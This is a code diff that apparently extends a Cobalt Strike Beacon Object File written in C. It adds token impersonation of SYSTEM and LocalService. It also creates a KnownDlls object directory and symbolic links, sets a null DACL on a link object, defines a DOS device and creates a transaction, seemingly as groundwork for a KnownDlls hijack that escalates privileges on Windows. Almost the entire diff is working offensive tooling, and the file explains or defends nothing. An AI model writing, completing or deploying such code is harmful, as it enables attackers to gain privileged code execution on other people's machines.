@@ -42,6 +42,11 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		LPWSTR			DskPth = NULL;
 		LPWSTR			RegPth = NULL;
 
+		HANDLE			DirObj = NULL;
+		HANDLE			LnkObj = NULL;
+		HANDLE			LnkTwo = NULL;
+		HANDLE			MgrPtr = NULL;
+
 		PVOID			NtlMod = NULL;
 		PVOID			K32Mod = NULL;
 		PVOID			AdvMod = NULL;
@@ -68,10 +73,13 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		K32Mod = PebGetModule( H_LIB_KERNEL32 );
 		AdvMod = PebGetModule( H_LIB_ADVAPI32 );
 
+		ApiTbl.InitializeSecurityDescriptor = PeGetFuncEat( AdvMod, H_API_INITIALIZESECURITYDESCRIPTOR );
 		ApiTbl.RtlAnsiStringToUnicodeString = PeGetFuncEat( NtlMod, H_API_RTLANSISTRINGTOUNICODESTRING );
 		ApiTbl.NtCreateSymbolicLinkObject   = PeGetFuncEat( NtlMod, H_API_NTCREATESYMBOLICLINKOBJECT );
 		ApiTbl.RtlAnsiStringToUnicodeSize   = PeGetFuncEat( NtlMod, H_API_RTLANSISTRINGTOUNICODESIZE );
+		ApiTbl.SetSecurityDescriptorDacl    = PeGetFuncEat( AdvMod, H_API_SETSECURITYDESCRIPTORDACL );
 		ApiTbl.NtCreateDirectoryObjectEx    = PeGetFuncEat( NtlMod, H_API_NTCREATEDIRECTORYOBJECTEX );
+		ApiTbl.SetKernelObjectSecurity      = PeGetFuncEat( AdvMod, H_API_SETKERNELOBJECTSECURITY );
 		ApiTbl.NtQueryInformationToken      = PeGetFuncEat( NtlMod, H_API_NTQUERYINFORMATIONTOKEN );
 		ApiTbl.ConvertStringSidToSidA       = PeGetFuncEat( AdvMod, H_API_CONVERTSTRINGSIDTOSIDA );
 		ApiTbl.RtlInitUnicodeString         = PeGetFuncEat( NtlMod, H_API_RTLINITUNICODESTRING );
@@ -81,7 +89,9 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		ApiTbl.IsTokenRestricted            = PeGetFuncEat( AdvMod, H_API_ISTOKENRESTRICTED );
 		ApiTbl.NtGetNextProcess             = PeGetFuncEat( NtlMod, H_API_NTGETNEXTPROCESS );
 		ApiTbl.DuplicateTokenEx             = PeGetFuncEat( AdvMod, H_API_DUPLICATETOKENEX );
+		ApiTbl.DefineDosDeviceW             = PeGetFuncEat( K32Mod, H_API_DEFINEDOSDEVICEW );
 		ApiTbl.NtCreateSection              = PeGetFuncEat( NtlMod, H_API_NTCREATESECTION );
+		ApiTbl.SetThreadToken               = PeGetFuncEat( AdvMod, H_API_SETTHREADTOKEN );
 		ApiTbl.RtlEqualSid                  = PeGetFuncEat( NtlMod, H_API_RTLEQUALSID );
 		ApiTbl.LocalAlloc                   = PeGetFuncEat( K32Mod, H_API_LOCALALLOC );
 		ApiTbl._vsnprintf                   = PeGetFuncEat( NtlMod, H_API_VSNPRINTF );
@@ -104,13 +114,90 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		LclTok = TokenGetTokenWithSidAndPrivilegeCount( &ApiTbl, C_PTR( G_SYM( "S-1-5-19" ) ), 0x00 );
 
 		if ( SysTok != NULL && LclTok != NULL ) {
-			/* oh yeah! */
+			if ( ApiTbl.SetThreadToken( NULL, SysTok ) ) {
+				RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
+				RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
+
+				ApiTbl.RtlInitUnicodeString( &UniOne, C_PTR( G_SYM( L"\\GLOBAL??\\KnownDlls" ) ) );
+				InitializeObjectAttributes( &ObjAtt, &UniOne, 0x40, NULL, NULL );
+
+				if ( !( ApiTbl.NtCreateDirectoryObjectEx( &DirObj, STANDARD_RIGHTS_REQUIRED | 0xF, &ObjAtt, NULL, 0 ) >= 0 ) ) {
+					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create the object directory." ) ) );
+					goto Leave;
+				};
+
+				RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
+				RtlSecureZeroMemory( &UniTwo, sizeof( UniTwo ) );
+				RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
+
+				ApiTbl.RtlInitUnicodeString( &UniOne, KwnPth );
+				ApiTbl.RtlInitUnicodeString( &UniTwo, LnkPth );
+				InitializeObjectAttributes( &ObjAtt, &UniOne, 0x40, NULL, NULL );
+
+				if ( !( ApiTbl.NtCreateSymbolicLinkObject( &LnkObj, STANDARD_RIGHTS_REQUIRED | 0x1, &ObjAtt, &UniTwo ) >= 0 ) ) {
+					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create symbolic link." ) ) );
+					goto Leave;
+				};
+
+				RtlSecureZeroMemory( &SecDes, sizeof( SecDes ) );
+
+				if ( ! ApiTbl.InitializeSecurityDescriptor( &SecDes, SECURITY_DESCRIPTOR_REVISION ) ) {
+					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create a security descriptor." ) ) );
+					goto Leave;
+				};
+
+				if ( ! ApiTbl.SetSecurityDescriptorDacl( &SecDes, TRUE, NULL, FALSE ) ) {
+					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not set the dacl on security descriptor." ) ) );
+					goto Leave;
+				};
+
+				if ( ! ApiTbl.SetKernelObjectSecurity( LnkObj, DACL_SECURITY_INFORMATION, &SecDes ) ) {
+					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not set the dacl on the link object." ) ) );
+					goto Leave;
+				};
+
+				if ( ApiTbl.SetThreadToken( NULL, LclTok ) ) {
+					RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
+					RtlSecureZeroMemory( &UniTwo, sizeof( UniTwo ) );
+					RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
+
+					ApiTbl.RtlInitUnicodeString( &UniOne, C_PTR( G_SYM( L"\\??\\GLOBALROOT" ) ) );
+					ApiTbl.RtlInitUnicodeString( &UniTwo, C_PTR( G_SYM( L"\\GLOBAL??" ) ) );
+					InitializeObjectAttributes( &ObjAtt, &UniOne, 0x40, NULL, NULL );
+
+					if ( !( ApiTbl.NtCreateSymbolicLinkObject( &LnkTwo, STANDARD_RIGHTS_REQUIRED | 0x1, &ObjAtt, &UniTwo ) >= 0 ) ) {
+						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create symbolic link object." ) ) );
+						goto Leave;
+					};
+
+					if ( ! ApiTbl.DefineDosDeviceW( DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, GblPth, ObjPth ) ) {
+						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not define a dos device." ) ) );
+						goto Leave;
+					};
+
+					if ( ApiTbl.SetThreadToken( NULL, SysTok ) ) {
+						RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
+						InitializeObjectAttributes( &ObjAtt, NULL, 0, NULL, NULL );
+
+						if ( !( ApiTbl.NtCreateTransaction( &MgrPtr, TRANSACTION_ALL_ACCESS, &ObjAtt, NULL, NULL, 0, 0, 0, NULL, NULL ) >= 0 ) ) {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create a transaction." ) ) );
+							goto Leave;
+						};
+					} else {
+						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not impersonate system." ) ) );
+						goto Leave;
+					};
+				} else {
+					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not impersonate local system." ) ) );
+					goto Leave;
+				};
+			} else {
+				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not impersonate system." ) ) );
+				goto Leave;
+			};
 		} else {
-			BeaconApi->BeaconPrintf(
-					CALLBACK_ERROR,
-					C_PTR( G_SYM( "could not get tokens needed. 0x%x" ) ),
-					NtCurrentTeb()->LastErrorValue
-			);
+			BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get tokens needed." ) ) );
+			goto Leave;
 		};
 Leave:
 		if ( SysTok != NULL ) {
@@ -119,6 +206,19 @@ Leave:
 		if ( LclTok != NULL ) {
 			ApiTbl.NtClose( LclTok );
 		};
+		if ( DirObj != NULL ) {
+			ApiTbl.NtClose( DirObj );
+		};
+		if ( LnkObj != NULL ) {
+			ApiTbl.NtClose( LnkObj );
+		};
+		if ( LnkTwo != NULL ) {
+			ApiTbl.NtClose( LnkTwo );
+		};
+		if ( MgrPtr != NULL ) {
+			ApiTbl.NtClose( MgrPtr );
+		};
+
 		if ( KwnPth != NULL ) {
 			ApiTbl.LocalFree( KwnPth );
 		};
